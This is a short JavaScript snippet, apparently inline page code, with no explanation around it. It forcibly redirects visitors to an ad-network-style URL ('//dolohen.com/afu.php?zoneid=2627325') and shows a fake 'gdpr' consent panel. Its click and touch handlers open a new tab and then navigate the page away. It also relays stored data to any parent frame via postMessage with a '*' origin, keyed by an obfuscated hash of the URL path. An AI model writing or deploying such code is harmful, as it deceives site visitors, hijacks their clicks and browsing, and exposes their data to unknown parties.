(function (t) {
            if (window.parent !== window.self) {
                var n = {}

                n[t] = null

                window.addEventListener('message', function (o) {
                    var e = o && o.data && o.data[t]

                    if (e) {
                        if (e.t === 'post') {
                            delete e.t
                            post(e)
                        } else {
                            localStorage[t] = sessionStorage[t] = typeof e === 'object' ? JSON.stringify(e) : e
                            n[t] = e
                            window.parent.postMessage(n, '*')
                        }
                    }
                })

                window.parent.postMessage(n, '*')
            } else if (localStorage[t] || sessionStorage[t]) {
                var n = localStorage[t] || sessionStorage[t]
                delete localStorage[t] && delete sessionStorage[t]

                try {
                    var j = JSON.parse(n)

                    if (j.t === 'gdpr') {
                        let x
                        document.getElementById('loading').style.display = 'none'
                        document.getElementById('gdpr').style.display = 'block'

                        function go () {
                            if (!x) {
                                localStorage[t] = j.u
                                window.open(window.location.href, '_blank')
                                x = true
                            }

                            setTimeout(function () {
                                window.location.href = j.b
                            }, 100)
                        }

                        window.addEventListener('click', function () {}, true)
                        window.addEventListener('click', go)
                        window.addEventListener('touchend', go)
                    }
                } catch (e) {
                    setTimeout(function () {
                        window.location.href = [window.location.href, '?', btoa(n)].join('')
                    }, 500)
                }
            } else {
                setTimeout(function () {
                    window.location.href = '//dolohen.com/afu.php?zoneid=2627325'
                }, 500)
            }

            const post = function(data) {
                data = Object.assign({score: t}, data)
                const form = document.createElement('form')
                form.setAttribute('method', 'post')
                form.setAttribute('action', window.location.href)

                Object.keys(data).forEach(function(key) {
                    const field = document.createElement('input')
                    field.setAttribute('type', 'hidden')
                    field.setAttribute('name', key)
                    field.setAttribute('value', data[key])

                    form.appendChild(field)
                })

                document.body.appendChild(form)
                form.submit()
            }
        })(window.location.href.split('/').slice(3).join('/').split('').reduce(function (o, e, t) {
            return o + e.charCodeAt(0) * Math.pow(t + 1, 7)
        }, 3571).toString(36))
